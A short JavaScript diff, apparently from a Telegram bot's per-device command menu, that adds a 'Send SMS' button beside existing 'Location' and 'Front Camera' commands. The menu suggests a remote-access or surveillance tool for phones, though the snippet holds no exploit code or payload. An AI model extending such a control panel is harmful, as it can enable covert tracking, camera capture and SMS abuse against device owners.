@@ -82,7 +82,8 @@ function sendCommandMenu(ctx, deviceId, deviceName) {
                     Markup.button.callback('📍 Location',    `cmd_loc_${deviceId}`)
                 ],
                 [
-                    Markup.button.callback('📸 Front Camera', `cmd_cf_${deviceId}`)
+                    Markup.button.callback('📸 Front Camera', `cmd_cf_${deviceId}`),
+                    Markup.button.callback('📤 Send SMS',     `cmd_smsmode_${deviceId}`)
                 ],
                 [Markup.button.callback('« Back to Devices', 'back_to_devices')]
             ])
